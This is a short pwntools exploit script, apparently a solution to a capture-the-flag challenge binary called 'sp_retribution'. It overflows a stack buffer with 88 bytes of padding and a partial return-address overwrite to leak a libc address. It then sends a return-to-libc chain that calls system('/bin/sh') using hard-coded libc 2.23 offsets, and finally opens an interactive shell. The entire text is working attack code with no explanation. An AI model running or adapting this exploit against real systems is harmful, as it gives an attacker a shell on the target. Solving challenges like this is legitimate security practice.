from pwn import *

#p = process('./sp_retribution')
p = gdb.debug('./sp_retribution', gdbscript='c')

p.recv()
p.sendline(b'2')
p.recv()
p.sendline(b'deadbeef')
p.recv()


padding = b'A'*88

payload = b''
payload += padding
payload += b'\x55\x0a'
p.send(payload)

p.recvuntil(b'y = [')
leak = p. recvuntil(b']')[:-1]
libc = int(leak, 16) - 0x3c6780
print(hex(libc))

# libc6_2.23-0ubuntu11.3_amd64
offset___libc_start_main_ret = 0x20840
offset_system = 0x00000000000453a0
offset_dup2 = 0x00000000000f7a70
offset_read = 0x00000000000f7350
offset_write = 0x00000000000f73b0
offset_str_bin_sh = 0x18ce57
pop_rdi = 0x021112

p.sendline(b'deadbeef')
p.recv()

payload = b''
payload += padding
payload += p64(libc+pop_rdi)
payload += p64(libc+offset_str_bin_sh)
payload += p64(libc+offset_system)

p.send(payload)
print(p.recv())
p.interactive()
